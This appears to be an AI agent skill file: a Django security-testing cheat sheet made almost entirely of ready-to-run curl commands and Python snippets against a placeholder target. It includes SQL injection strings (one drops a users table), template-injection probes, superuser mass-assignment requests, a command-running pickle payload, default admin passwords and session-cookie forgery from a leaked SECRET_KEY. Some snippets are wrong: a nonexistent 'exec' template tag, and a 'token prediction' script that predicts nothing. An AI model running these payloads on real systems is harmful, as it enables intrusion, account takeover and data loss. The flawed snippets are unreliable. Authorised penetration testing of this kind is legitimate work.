---
name: django
description: Django framework security testing - common vulnerabilities, misconfigurations, and Django-specific attacks
---

# Django Framework Security

## Fingerprinting

### Identify Django
```bash
# Check headers
curl -I https://target.com | grep -i "x-frame-options\|x-content-type-options"

# Check for Django admin
curl -s https://target.com/admin/
curl -s https://target.com/admin/login/

# Check for Django debug page
curl -s https://target.com/nonexistent/ | grep -i "django\|debug"

# Check for Django REST framework
curl -s https://target.com/api/ | grep -i "django\|rest_framework"
```

### Version Detection
```bash
# Check for version in debug page (if DEBUG=True)
curl -s https://target.com/nonexistent/ | grep -o "Django Version: [0-9.]*"

# Check for version in admin page
curl -s https://target.com/admin/ | grep -o "Django version [0-9.]*"
```

## Common Vulnerabilities

### 1. Debug Mode Enabled

**Exposed debug information**
```bash
# Trigger debug page
curl -s https://target.com/nonexistent/

# Extract sensitive information
curl -s https://target.com/nonexistent/ | grep -iE "(settings|database|password|secret|api_key)"

# Check for exposed settings
curl -s https://target.com/settings/
curl -s https://target.com/debug/
```

### 2. Django Admin Exposure

**Default admin paths**
```bash
curl -s https://target.com/admin/
curl -s https://target.com/admin/login/
curl -s https://target.com/django-admin/
curl -s https://target.com/backend/

# Check for default credentials
# admin/admin
# admin/password
# admin/admin123
```

### 3. SQL Injection

**Django ORM bypass**
```bash
# Test for raw SQL queries
curl "https://target.com/api/users?search=admin' OR '1'='1"
curl "https://target.com/api/users?id=1 UNION SELECT 1,2,3--"

# Test for ORM injection via extra()
curl "https://target.com/api/users?order_by=1;DROP TABLE users--"

# Test for RawSQL injection
curl "https://target.com/api/users?filter=1' OR 1=1--"
```

### 4. Mass Assignment

**Django ModelForm vulnerabilities**
```bash
# Test for mass assignment
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"username": "attacker", "is_staff": true, "is_superuser": true}'

# Test for hidden field manipulation
curl -X POST https://target.com/profile/update \
  -d "username=user&email=user@target.com&is_admin=true"
```

### 5. Server-Side Template Injection (SSTI)

**Django template injection**
```bash
# Test for SSTI
curl "https://target.com/search?q={{7*7}}"
curl "https://target.com/search?q={% debug %}"

# Django template tags
curl "https://target.com/search?q={% load i18n %}{% trans 'test' %}"
curl "https://target.com/search?q={% csrf_token %}"

# RCE via template injection (if custom template tags are loaded)
curl "https://target.com/search?q={% load custom_tags %}{% exec 'id' %}"
```

### 6. Insecure Direct Object References (IDOR)

**Django REST Framework IDOR**
```bash
# Test for IDOR in API endpoints
curl https://target.com/api/users/1/
curl https://target.com/api/users/2/
curl https://target.com/api/users/admin/

# Test for IDOR with UUIDs
curl https://target.com/api/users/550e8400-e29b-41d4-a716-446655440000/

# Test for IDOR in nested resources
curl https://target.com/api/users/1/orders/
curl https://target.com/api/users/2/orders/
```

### 7. CSRF Token Bypass

**CSRF protection bypass**
```bash
# Check if CSRF protection is enabled
curl -I https://target.com/login/ | grep -i "csrf"

# Test for CSRF token bypass
curl -X POST https://target.com/api/update \
  -H "X-CSRFToken: invalid" \
  -d "data=test"

# Test for CSRF via subdomain
# If target.com has CSRF protection, check if subdomain.target.com can bypass it
```

### 8. Session Fixation

**Session management vulnerabilities**
```bash
# Check session cookie
curl -I https://target.com/ | grep -i "set-cookie"

# Test for session fixation
curl -c cookies.txt https://target.com/
# Check if session ID changes after login

# Test for session hijacking
# Extract session ID from cookie and use it in another browser
```

## Django REST Framework Specific

### 1. API Endpoint Enumeration
```bash
# Check for API root
curl -s https://target.com/api/
curl -s https://target.com/api/v1/
curl -s https://target.com/api/v2/

# Check for common endpoints
curl -s https://target.com/api/users/
curl -s https://target.com/api/auth/
curl -s https://target.com/api/login/
curl -s https://target.com/api/logout/
curl -s https://target.com/api/register/
```

### 2. Authentication Bypass
```bash
# Test for JWT vulnerabilities
curl -H "Authorization: Bearer <token>" https://target.com/api/users/

# Test for session authentication bypass
curl -b "sessionid=<session_id>" https://target.com/api/users/

# Test for API key bypass
curl -H "X-API-Key: invalid" https://target.com/api/users/
```

### 3. Pagination Bypass
```bash
# Test for pagination bypass
curl "https://target.com/api/users/?page=1&page_size=1000000"
curl "https://target.com/api/users/?limit=1000000"
curl "https://target.com/api/users/?offset=0&limit=1000000"
```

## Django-Specific Attacks

### 1. Pickle Deserialization
```bash
# Test for pickle deserialization in Django cache
curl -X POST https://target.com/api/cache \
  -H "Content-Type: application/json" \
  -d '{"data": "gASVDwAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg=="}'
```

### 2. Django Secret Key Extraction
```bash
# If debug mode is enabled, extract SECRET_KEY
curl -s https://target.com/nonexistent/ | grep -o "SECRET_KEY = '[^']*'"

# Use SECRET_KEY to forge session cookies
python3 -c "
from django.core.signing import loads, dumps
from django.conf import settings

settings.configure(SECRET_KEY='extracted_secret_key')

# Forge session cookie
session_data = {'_auth_user_id': '1', '_auth_user_backend': 'django.contrib.auth.backends.ModelBackend'}
forged_cookie = dumps(session_data, salt='django.contrib.sessions.backends.signed_cookies')
print(forged_cookie)
"
```

### 3. Django Password Reset Token Prediction
```bash
# If using default PasswordResetTokenGenerator
# Tokens are based on: user.pk, user.password, timestamp, user.last_login

# If you can predict these values, you can forge reset tokens
python3 -c "
from django.contrib.auth.tokens import PasswordResetTokenGenerator
from django.contrib.auth import get_user_model

User = get_user_model()
user = User.objects.get(pk=1)

token_generator = PasswordResetTokenGenerator()
token = token_generator.make_token(user)
print(token)
"
```

## Testing Checklist

- [ ] Identify Django version
- [ ] Check for debug mode
- [ ] Test for Django admin exposure
- [ ] Test for SQL injection (ORM bypass)
- [ ] Test for mass assignment
- [ ] Test for SSTI
- [ ] Test for IDOR in Django REST Framework
- [ ] Test CSRF protection
- [ ] Test session management
- [ ] Enumerate API endpoints
- [ ] Test authentication bypass
- [ ] Check for pickle deserialization
- [ ] Try to extract SECRET_KEY
- [ ] Test password reset token prediction

## Tools

```bash
# Django management commands (if you have shell access)
python manage.py dbshell
python manage.py shell
python manage.py dumpdata

# SQLMap for Django
sqlmap -u "https://target.com/api/users?id=1" --dbms=postgresql

# Nuclei templates for Django
nuclei -u https://target.com -t ~/nuclei-templates/technologies/django/
```
